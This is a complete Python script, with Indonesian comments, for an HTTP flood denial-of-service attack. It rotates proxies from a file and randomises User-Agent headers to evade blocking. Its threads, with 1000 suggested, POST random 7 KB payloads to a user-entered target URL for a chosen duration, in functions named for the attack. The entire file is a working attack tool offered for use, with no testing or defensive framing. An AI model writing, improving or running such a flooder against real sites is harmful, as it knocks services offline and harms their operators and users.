import requests
import random
import string
import threading
import time

# Fungsi untuk membuat User-Agent acak
def generate_random_user_agent():
    browsers = ["Chrome", "Firefox", "Safari", "Opera", "Edge"]
    os_platforms = ["Windows NT 10.0; Win64; x64", "Macintosh; Intel Mac OS X 10_15_7", 
                    "X11; Linux x86_64", "Windows NT 6.1; WOW64", "Windows NT 6.1; Win64; x64"]
    browser_version = f"{random.randint(60, 100)}.0.{random.randint(1000, 9999)}.{random.randint(100, 999)}"
    
    user_agent = f"Mozilla/5.0 ({random.choice(os_platforms)}) AppleWebKit/537.36 (KHTML, like Gecko) {random.choice(browsers)}/{browser_version} Safari/537.36"
    return user_agent

# Fungsi untuk membaca proxy dari file
def load_proxies(filename):
    with open(filename, 'r') as file:
        proxies = [line.strip() for line in file if line.strip()]
    return proxies

# Fungsi untuk membuat data request palsu
def generate_fake_data(size_kb):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size_kb * 1024))

# Fungsi untuk mengirimkan request menggunakan proxy
def send_request_with_proxy(url, proxies, data_size_kb):
    proxy = random.choice(proxies)
    proxy_dict = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    }
    data = generate_fake_data(data_size_kb)
    headers = {
        "User-Agent": generate_random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
    }

    try:
        response = requests.post(url, data=data, proxies=proxy_dict, headers=headers)
        print(f"Proxy: {proxy}, Response Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Proxy: {proxy}, Request failed: {e}")

# Fungsi untuk menjalankan thread
def attack(url, proxies, data_size_kb, num_threads, duration_seconds):
    end_time = time.time() + duration_seconds
    threads = []

    def run_attack():
        while time.time() < end_time:
            send_request_with_proxy(url, proxies, data_size_kb)
    
    for _ in range(num_threads):
        thread = threading.Thread(target=run_attack)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# Main Program
if __name__ == "__main__":
    url = input("Masukkan URL target: ")  # Input URL target dari pengguna
    proxy_file = "proxy.txt"  # Ganti dengan nama file proxy Anda
    data_size_kb = 7  # Ukuran data request dalam KB
    num_threads = int(input("Masukkan jumlah thread (contoh: 1000): "))  # Input jumlah thread dari pengguna
    duration_seconds = int(input("Masukkan durasi serangan dalam detik (contoh: 60): "))  # Input durasi serangan dari pengguna

    # Memuat proxy dari file
    proxies = load_proxies(proxy_file)

    # Menjalankan serangan
    attack(url, proxies, data_size_kb, num_threads, duration_seconds)
